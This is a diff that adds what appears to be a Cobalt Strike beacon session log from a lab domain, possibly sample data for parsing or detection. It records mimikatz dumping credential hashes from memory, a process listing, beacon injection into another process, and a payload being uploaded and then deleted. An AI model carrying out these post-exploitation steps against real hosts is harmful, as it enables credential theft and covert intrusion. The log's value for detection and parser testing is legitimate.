@@ -1,0 +1,514 @@
+08/17 20:07:48 UTC [metadata] 192.168.23.132 <- 192.168.23.132; computer: COMPUTER03; user: SYSTEM *; process: notepad.exe; pid: 7668; os: Windows; version: 10.0; build: 18363; beacon arch: x64 (x64)
+08/17 20:08:52 UTC [input] <analyst01> sleep 1 20
+08/17 20:08:52 UTC [task] <T1029> Tasked beacon to sleep for 1s (20% jitter)
+08/17 20:09:41 UTC [checkin] host called home, sent: 16 bytes
+08/17 20:09:50 UTC [input] <analyst01> logonpasswords
+08/17 20:09:50 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+08/17 20:09:51 UTC [checkin] host called home, sent: 438866 bytes
+08/17 20:09:52 UTC [output]
+received output:
+
+Authentication Id : 0 ; 2295297 (00000000:00230601)
+Session           : Interactive from 3
+User Name         : user01
+Domain            : EXAMPLE
+Logon Server      : DC01
+Logon Time        : 8/14/2020 4:23:08 PM
+SID               : S-1-5-21-2173803269-2782387971-1800924430-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : user01
+	 * Domain   : EXAMPLE
+	 * NTLM     : 39bf3ac12fd5a276b56ac11ea09516b9
+	 * SHA1     : 0d4e6152762761c7eeddb28c0e1aa6072a1b3cf9
+	 * DPAPI    : 394a964b8614594f4ae236c017fd8d1f
+	tspkg :	
+	wdigest :	
+	 * Username : user01
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : user01
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2255449 (00000000:00226a59)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/14/2020 4:22:43 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2255148 (00000000:0022692c)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/14/2020 4:22:43 PM
+SID               : S-1-5-90-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2254705 (00000000:00226771)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/14/2020 4:22:43 PM
+SID               : S-1-5-96-0-3
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 850781 (00000000:000cfb5d)
+Session           : Interactive from 2
+User Name         : rrockstone
+Domain            : EXAMPLE
+Logon Server      : DC01
+Logon Time        : 8/14/2020 3:07:34 PM
+SID               : S-1-5-21-2173803269-2782387971-1800924430-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : rrockstone
+	 * Domain   : EXAMPLE
+	 * NTLM     : 735cb4e5f8ee5e03d96841259fb28dad
+	 * SHA1     : ae6940a8b7b27af74223f2ea73202cfab5c1e14b
+	 * DPAPI    : 9f8658d30bf3dcba3966d1cc0919d4b4
+	tspkg :	
+	wdigest :	
+	 * Username : rrockstone
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : rrockstone
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 850739 (00000000:000cfb33)
+Session           : Interactive from 2
+User Name         : rrockstone
+Domain            : EXAMPLE
+Logon Server      : DC01
+Logon Time        : 8/14/2020 3:07:34 PM
+SID               : S-1-5-21-2173803269-2782387971-1800924430-1106
+	msv :	
+	 [00000003] Primary
+	 * Username : rrockstone
+	 * Domain   : EXAMPLE
+	 * NTLM     : 735cb4e5f8ee5e03d96841259fb28dad
+	 * SHA1     : ae6940a8b7b27af74223f2ea73202cfab5c1e14b
+	 * DPAPI    : 9f8658d30bf3dcba3966d1cc0919d4b4
+	tspkg :	
+	wdigest :	
+	 * Username : rrockstone
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : rrockstone
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 833182 (00000000:000cb69e)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:07:06 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 833166 (00000000:000cb68e)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:07:06 PM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 832319 (00000000:000cb33f)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:07:06 PM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 625768 (00000000:00098c68)
+Session           : Interactive from 1
+User Name         : user01
+Domain            : EXAMPLE
+Logon Server      : DC01
+Logon Time        : 8/14/2020 3:06:47 PM
+SID               : S-1-5-21-2173803269-2782387971-1800924430-1000
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:04:21 PM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : COMPUTER03$
+Domain            : EXAMPLE
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:04:21 PM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : computer03$
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 37506 (00000000:00009282)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:04:21 PM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : COMPUTER03$
+	 * Domain   : example.int
+	 * Password : NOTAREALPASSWORD0010!
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 36639 (00000000:00008f1f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:04:20 PM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * NTLM     : 99f79427a69dc58ea7722f1036bc96e
+	 * SHA1     : fdaa5f923c08e71359fd3469ff2d75b0a073a319
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : COMPUTER03$
+Domain            : EXAMPLE
+Logon Server      : (null)
+Logon Time        : 8/14/2020 3:04:20 PM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : COMPUTER03$
+	 * Domain   : EXAMPLE
+	 * Password : (null)
+	kerberos :	
+	 * Username : computer03$
+	 * Domain   : EXAMPLE.INT
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
+08/17 20:10:52 UTC [input] <analyst01> ps
+08/17 20:10:52 UTC [task] <T1057> Tasked beacon to list processes
+08/17 20:10:53 UTC [checkin] host called home, sent: 12 bytes
+08/17 20:10:53 UTC [output]
+[System Process]	0	0
+System	0	4	x64	NT AUTHORITY\SYSTEM	0
+Registry	4	68	x64	NT AUTHORITY\SYSTEM	0
+smss.exe	4	272	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	360	368	x64	NT AUTHORITY\SYSTEM	0
+wininit.exe	360	464	x64	NT AUTHORITY\SYSTEM	0
+services.exe	464	584	x64	NT AUTHORITY\SYSTEM	0
+lsass.exe	464	600	x64	NT AUTHORITY\SYSTEM	0
+fontdrvhost.exe	464	680	x64	Font Driver Host\UMFD-0	0
+svchost.exe	584	740	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	788	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	584	988	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	996	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	584	324	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	584	316	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	584	372	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	584	456	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	1048	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	584	1244	x64	NT AUTHORITY\LOCAL SERVICE	0
+Memory Compression	4	1572	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	1640	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	584	1708	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	584	1732	x64	NT AUTHORITY\LOCAL SERVICE	0
+spoolsv.exe	584	1964	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	300	x64	NT AUTHORITY\SYSTEM	0
+VGAuthService.exe	584	1664	x64	NT AUTHORITY\SYSTEM	0
+vmtoolsd.exe	584	1820	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	2180	x64	NT AUTHORITY\SYSTEM	0
+WmiPrvSE.exe	740	2424	x64	NT AUTHORITY\NETWORK SERVICE	0
+dllhost.exe	584	2504	x64	NT AUTHORITY\SYSTEM	0
+msdtc.exe	584	2836	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	584	1780	x64	NT AUTHORITY\LOCAL SERVICE	0
+GoogleUpdate.exe	988	3344	x86	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	3944	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	4000	x64	NT AUTHORITY\SYSTEM	0
+GoogleCrashHandler.exe	3344	3356	x86	NT AUTHORITY\SYSTEM	0
+GoogleCrashHandler64.exe	3344	3564	x64	NT AUTHORITY\SYSTEM	0
+SgrmBroker.exe	584	3572	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	3892	x64	NT AUTHORITY\LOCAL SERVICE	0
+SearchIndexer.exe	584	3700	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	584	4604	x64	NT AUTHORITY\LOCAL SERVICE	0
+csrss.exe	5340	5356	x64	NT AUTHORITY\SYSTEM	2
+winlogon.exe	5340	5396	x64	NT AUTHORITY\SYSTEM	2
+dwm.exe	5396	5464	x64	Window Manager\DWM-2	2
+fontdrvhost.exe	5396	5500	x64	Font Driver Host\UMFD-2	2
+sihost.exe	988	5876	x64	EXAMPLE\rrockstone	2
+svchost.exe	584	5900	x64	EXAMPLE\rrockstone	2
+taskhostw.exe	988	5964	x64	EXAMPLE\rrockstone	2
+explorer.exe	6104	6116	x64	EXAMPLE\rrockstone	2
+svchost.exe	584	1796	x64	EXAMPLE\rrockstone	2
+dllhost.exe	740	4500	x64	EXAMPLE\rrockstone	2
+StartMenuExperienceHost.exe	740	4864	x64	EXAMPLE\rrockstone	2
+WinProcess.exe	740	4912	x64	EXAMPLE\rrockstone	2
+SearchUI.exe	740	5088	x64	EXAMPLE\rrockstone	2
+WinProcess.exe	740	3436	x64	EXAMPLE\rrockstone	2
+ApplicationFrameHost.exe	740	1684	x64	EXAMPLE\rrockstone	2
+MicrosoftEdge.exe	740	4016	x64	EXAMPLE\rrockstone	2
+browser_broker.exe	740	4816	x64	EXAMPLE\rrockstone	2
+Windows.WARP.JITService.exe	4604	4780	x64	NT AUTHORITY\LOCAL SERVICE	0
+WinProcess.exe	740	5348	x64	EXAMPLE\rrockstone	2
+MicrosoftEdgeCP.exe	740	1036	x64	EXAMPLE\rrockstone	2
+MicrosoftEdgeSH.exe	5348	5768	x64	EXAMPLE\rrockstone	2
+WinProcess.exe	740	104	x64	EXAMPLE\rrockstone	2
+SecurityHealthService.exe	584	6040	x64	NT AUTHORITY\SYSTEM	0
+vm3dservice.exe	6116	5848	x64	EXAMPLE\rrockstone	2
+vmtoolsd.exe	6116	6012	x64	EXAMPLE\rrockstone	2
+OneDrive.exe	6116	2832	x86	EXAMPLE\rrockstone	2
+ShellExperienceHost.exe	740	2740	x64	EXAMPLE\rrockstone	2
+WinProcess.exe	740	5536	x64	EXAMPLE\rrockstone	2
+WinStore.App.exe	740	3792	x64	EXAMPLE\rrockstone	2
+WinProcess.exe	740	3828	x64	EXAMPLE\rrockstone	2
+SecurityHealthHost.exe	740	4632	x64	EXAMPLE\rrockstone	2
+WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe	740	1700	x64	EXAMPLE\rrockstone	2
+dllhost.exe	740	4256	x64	EXAMPLE\rrockstone	2
+cmd.exe	6116	3664	x64	EXAMPLE\rrockstone	2
+conhost.exe	3664	4924	x64	EXAMPLE\rrockstone	2
+Microsoft.Photos.exe	740	3512	x64	EXAMPLE\rrockstone	2
+WinProcess.exe	740	5700	x64	EXAMPLE\rrockstone	2
+svchost.exe	584	3676	x64	NT AUTHORITY\SYSTEM	0
+LogonUI.exe	5396	288	x64	NT AUTHORITY\SYSTEM	2
+csrss.exe	2584	3560	x64	NT AUTHORITY\SYSTEM	3
+winlogon.exe	2584	6016	x64	NT AUTHORITY\SYSTEM	3
+dwm.exe	6016	936	x64	Window Manager\DWM-3	3
+YourPhone.exe	740	1612	x64	EXAMPLE\rrockstone	2
+fontdrvhost.exe	6016	248	x64	Font Driver Host\UMFD-3	3
+WinProcess.exe	740	5192	x64	EXAMPLE\rrockstone	2
+svchost.exe	584	4420	x64	EXAMPLE\user01	3
+sihost.exe	988	4460	x64	EXAMPLE\user01	3
+taskhostw.exe	988	4496	x64	EXAMPLE\user01	3
+explorer.exe	4696	3204	x64	EXAMPLE\user01	3
+svchost.exe	584	924	x64	EXAMPLE\user01	3
+dllhost.exe	740	4240	x64	EXAMPLE\user01	3
+dllhost.exe	740	2432	x64	EXAMPLE\user01	3
+StartMenuExperienceHost.exe	740	3200	x64	EXAMPLE\user01	3
+GameBar.exe	740	5792	x64	EXAMPLE\user01	3
+GameBarFTServer.exe	740	5416	x64	EXAMPLE\user01	3
+WinProcess.exe	740	1284	x64	EXAMPLE\user01	3
+WinProcess.exe	740	6220	x64	EXAMPLE\user01	3
+GameBarFT.exe	1284	6292	x64	EXAMPLE\user01	3
+SearchUI.exe	740	6444	x64	EXAMPLE\user01	3
+WinProcess.exe	740	6556	x64	EXAMPLE\user01	3
+ApplicationFrameHost.exe	740	6696	x64	EXAMPLE\user01	3
+MicrosoftEdge.exe	740	6712	x64	EXAMPLE\user01	3
+browser_broker.exe	740	6960	x64	EXAMPLE\user01	3
+Windows.WARP.JITService.exe	4604	7044	x64	NT AUTHORITY\LOCAL SERVICE	0
+WinProcess.exe	740	4368	x64	EXAMPLE\user01	3
+MicrosoftEdgeCP.exe	740	7004	x64	EXAMPLE\user01	3
+MicrosoftEdgeSH.exe	4368	7248	x64	EXAMPLE\user01	3
+ctfmon.exe	456	7372	x64	EXAMPLE\user01	3
+SecurityHealthSystray.exe	3204	7788	x64	EXAMPLE\user01	3
+vm3dservice.exe	3204	7864	x64	EXAMPLE\user01	3
+OneDrive.exe	3204	7888	x86	EXAMPLE\user01	3
+SecurityHealthHost.exe	740	4464	x64	EXAMPLE\user01	3
+ShellExperienceHost.exe	740	7740	x64	EXAMPLE\user01	3
+WinProcess.exe	740	5556	x64	EXAMPLE\user01	3
+notepad.exe	1536	7668	x64	NT AUTHORITY\SYSTEM	0
+Microsoft.Photos.exe	740	5528	x64	EXAMPLE\user01	3
+WinProcess.exe	740	2896	x64	EXAMPLE\user01	3
+
+
+08/17 20:13:32 UTC [input] <analyst01> inject 6556 x64
+08/17 20:13:37 UTC [task] <T1055> Tasked beacon to inject windows/beacon_bind_pipe (\\.\pipe\mspipe_effe) into 6556 (x64)
+08/17 20:13:37 UTC [checkin] host called home, sent: 255546 bytes
+08/17 20:13:38 UTC [output]
+established link to child beacon: 192.168.23.132
+
+08/17 20:28:35 UTC [checkin] host called home, sent: 31 bytes
+08/17 20:28:46 UTC [checkin] host called home, sent: 32 bytes
+08/17 20:28:47 UTC [checkin] host called home, sent: 64 bytes
+08/17 20:28:49 UTC [checkin] host called home, sent: 84 bytes
+08/17 20:28:52 UTC [checkin] host called home, sent: 100 bytes
+08/17 20:29:28 UTC [input] <analyst01> upload /home/analyst01/payloads/payload.txt (C:\Users\user01\Desktop\payload.txt)
+08/17 20:29:28 UTC [task] <> Tasked beacon to upload /home/analyst01/payloads/payload.txt as C:\Users\user01\Desktop\payload.txt
+08/17 20:29:28 UTC [indicator] file: fae46d7e8961c39828214755ce99c046 7246 bytes C:\Users\user01\Desktop\payload.txt
+08/17 20:29:28 UTC [checkin] host called home, sent: 7352 bytes
+08/17 20:30:07 UTC [input] <analyst01> rm C:\Users\user01\Desktop\payload.txt
+08/17 20:30:07 UTC [task] <T1107, > Tasked beacon to remove C:\Users\user01\Desktop\payload.txt
+08/17 20:30:08 UTC [checkin] host called home, sent: 102 bytes
+08/17 20:39:17 UTC [input] <analyst01> unlink 192.168.23.132 6556
+08/17 20:39:17 UTC [task] <T1090> Tasked to unlink 192.168.23.132@6556
+08/17 20:39:18 UTC [checkin] host called home, sent: 24 bytes
+08/17 20:39:18 UTC [error] lost link to child beacon: 192.168.23.132
+08/17 20:43:12 UTC [input] <analyst01> exit
+08/17 20:43:12 UTC [task] <> Tasked beacon to exit
+08/17 20:43:12 UTC [checkin] host called home, sent: 8 bytes
+08/17 20:43:12 UTC [output]
+beacon exit.
+
